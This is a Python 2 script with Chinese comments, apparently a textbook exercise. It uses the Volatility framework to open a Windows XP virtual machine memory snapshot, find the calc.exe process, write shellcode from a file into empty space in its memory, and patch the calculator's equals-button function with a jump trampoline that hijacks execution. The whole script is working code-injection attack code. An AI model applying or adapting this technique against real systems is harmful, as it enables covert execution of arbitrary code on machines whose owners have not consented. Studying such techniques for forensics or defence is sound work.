#!/usr/bin/python
#-*- coding:utf-8 -*-

import sys
import struct

#函数地址
equals_button = 0x01005D51

# 要分析的内存文件位置
memory_file = "D:\\Windows XP Professional-f6b49762.vmem"
slack_space = None
trampoline_offset = None

# 读入我们的shellcode
sc_fd = open("cmeasure.bin", "rb")
sc = sc_fd.read()
sc_fd.close()

sys.path.append("D:\\volatility-2.3")

import volatility.conf as conf
import volatility.registry as registry

registry.PluginImporter()
config = conf.ConfObject()

import volatility.commands as commands
import volatility.addrspace as addrspace

#注册配置给addrspace.BaseAddressSpace
registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSpace)

#设置配置
config.parse_options()
config.PROFILE = "WinXPSP3x86"
config.LOCATION = "file://%s" % memory_file

import volatility.plugins.taskmods as taskmods
#PSList用于检索内存镜像中正在运行的进程
p = taskmods.PSList(config)

#迭代所有进程，寻找计算器进程
for process in p.calculate():
    if str(process.ImageFileName) == "calc.exe":
        print "[*] Found calc.exe with PID %d" % process.UniqueProcessId
        print "[*] Hunting for physical offsets...please wait."
        #获取进程的整个地址空间
        address_space = process.get_process_address_space()
        #获取所有相应的内存页面
        pages = address_space.get_available_pages()

        # page[0]:页面地址，虚拟地址，在主机上的偏移
        # page[1]：页面大小
        for page in pages:
            #获取物理地址，相对于虚拟机文件的位置
            physical = address_space.vtop(page[0])
            if physical is not None:
                #打开虚拟机内存快照
                fd = open(memory_file, "r+")
                #设置当前位置偏移
                fd.seek(physical)
                #从该物理地址起，读入函数内存大小的数据
                buf = fd.read(page[1])

                try:
                    #在函数内存中寻找连续的空地址，以便插入shellcode
                    offset = buf.index("\x00" * len(sc))
                    #获得插入点的虚拟地址
                    slack_space = page[0] + offset

                    print "[*] Found good shellcode location!"
                    print "[*] Virtual address: 0x%08x" % slack_space
                    print "[*] Physical address: 0x%08x" % (physical + offset)
                    print "[*] Injecting shellcode."
                    #开始写入shellcode
                    fd.seek(physical + offset)
                    fd.write(sc)
                    fd.flush()

                    # 创建我们的跳转代码
                    # 对应的汇编指令为：
                    # mov ebx, ADDRESS_OF_SHELLCODE( shellcode地址)
                    # jmp ebx
                    #struct.pack将c类型打包程python可以处理的字节流
                    tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                    tramp += "\xff\xe3"

                    if trampoline_offset is not None:
                        break

                except:
                    pass

                fd.close()

            #是否是需要插入跳转代码的函数的位置
            if page[0] <= equals_button and equals_button < (page[0] + page[1] -7):
                print "[*] Found our trampoline target at: 0x%08x" % (physical)
                # 计算虚拟偏移
                #记录函数相对于虚拟快照的偏移，循环结束后，开始在此处插入跳转代码
                v_offset = equals_button - page[0]
                # 计算物理偏移
                trampoline_offset = physical+ v_offset

                print "[*] Found our trampoline target at: 0x%08x" % (trampoline_offset)

                if slack_space is not None:
                    break


        print "[*] Writing trampoline..."
        #插入跳转代码
        fd = open(memory_file, "r+")
        fd.seek(trampoline_offset)
        fd.write(tramp)
        fd.close()

        print "[*] Done injecting code."

